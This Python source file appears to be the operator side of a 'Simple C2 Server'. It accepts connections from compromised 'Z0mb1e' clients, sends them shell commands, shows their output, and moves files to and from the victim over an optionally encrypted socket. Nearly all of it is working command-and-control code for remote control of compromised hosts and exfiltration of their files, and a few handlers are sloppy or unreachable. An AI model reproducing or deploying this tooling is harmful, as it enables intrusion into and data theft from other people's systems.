import socket
import sys
import uuid
import argparse
import time
from banner import banner
import os
import readline
import colorama
from secure_connection import SecureProtocol
#Initialize stage
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def get_help():
	print(""" download <file_directory> - Download a file. Needing file directory
	   	      upload <file_directory> - Uploading a file. Needing the same as download 
	""")
def send_message(conn, input_data):
    if args.secure == False:
	    encode_data = input_data.encode()
	    conn.sendall(encode_data)
    else:
        encode_data = p.encrypt(input_data)
        conn.sendall(encode_data)

def recv_message(conn):
	buffer = ""
	while True:
		try:
			response = conn.recv(4096)
			if not response:
				sys.exit("Cient disconnected!")
			if args.secure == False:
        			data = response.decode()
			else:
        			data = p.decrypt(response)
			buffer += data
			if "<END_OF_CMD_OUTPUT>\n" in buffer:
                		output, buffer = buffer.split("<END_OF_CMD_OUTPUT>\n", 1)
                		print(f'Got the Z0mb1e response! -> {output}')
                		break
		except Exception as e:
				print(f"Failed to retrieve message! Error code: {e}")
				sys.exit(1)
		except Exception as e:
			try:
				err_code = "Sient thy tongue, methink we dost not share the same field!"
				if args.secure:
					err_code = p.encrypt(err_code)
				conn.sendall(err_code if not args.secure else err_code)
			except:
				pass
			sys.exit(f"Failed to retrieve message! Error code: {e}")
def download_file(conn, file_directory):
	with open(os.path.join(file_directory), 'wb') as file_request:
		while True:
			data = conn.recv(1024)
			if not data:
				break
			file_request.write(data)
	print(f"Downloaded! Target {file_directory} has been saved!")
	file_request.close()
def upload(conn, file_upload_directory):
	with open(os.path.join(file_upload_directory), 'rb') as file_to_send:
		while chunk := file_to_send.read(1024):
			conn.sendall(chunk)
	print(f'Upload complete! On destination of {file_upload_directory}')
def Connection_Stage(port):
	random_uuid = uuid.uuid4()
	conn, addr = s.accept()
	print(f"Got Zombie's connection from {addr} on {port}")
	try:
		while True:
			command = input(f"#Z0mb1e Task {random_uuid}> ")
			if command == "exit":
				conn.shutdown(socket.SHUT_RDWR)
				conn.sendall(b"quit")
				conn.close()
				sys.exit(0)
			elif command.startswith('download'):
				command_parts = command.split()
				if len(command_parts) == 2:
					file_directory = command_parts[1]
					download_file(conn, file_directory)
				else:
					print("Invalid syntax use or not providing the file path. Please make sure you've provided the file path before proceeding!")
					continue
			elif command == '?':
				get_help()
			elif command.startswith('upload'):
				command_parts = command.split()
				if len(command_parts) == 2:
					file_upload_directory = command_parts[1]
					upload(conn, file_upload_directory)
					continue
				else:
					print("You may forget to provide the upload file path. Please try again and this time with the path")
					continue
			else:
				send_message(conn, command)
				recv_message(conn)
	except KeyboardInterrupt:
			conn.shutdown(socket.SHUT_RDWR)
			conn.close()
			sys.exit('Exitted via keyboard!')
def Start_A_Server(ip, port): 
	try:
		if args.secure == False:
			s.bind((ip, port))
			s.listen(1)
		else:
			print("Server key:", key)
			s.bind((ip, port))
			s.listen(1)

		print(f"Server has started on {ip}:{port}")

		Connection_Stage(args.port)
	except (socket.error, socket.gaierror, socket.timeout) as e:
		s.close()
		sys.exit(f"An error has occured, due to: {e}")
	except Exception as e:
		s.close()
		sys.exit(f'An unexpected error has happened! : {e}')
	except KeyboardInterrupt:
		s.close()
		sys.exit("\nInterrupted via keyboard!")
if __name__ == "__main__":
	parser = argparse.ArgumentParser(prog='Simple C2 Server', description='Build a simple C2 server ')
	parser.add_argument('-i', '--ip', default='127.0.0.1', help='Enter your host ip whatever - Default: 127.0.0.1')
	parser.add_argument('-p', '--port', type=int, default=9999, help='The port you would like to run on - Default: 9999 why not?')
	parser.add_argument('-s', '--secure', action='store_true', default=False, help='Secure connection cuz why not?')
	args = parser.parse_args()
	if args.secure:
		p = SecureProtocol()
		key = p.get_key()
	else:
		p = None
		key = None
	banner()
	time.sleep(2)
	Start_A_Server(args.ip, args.port)
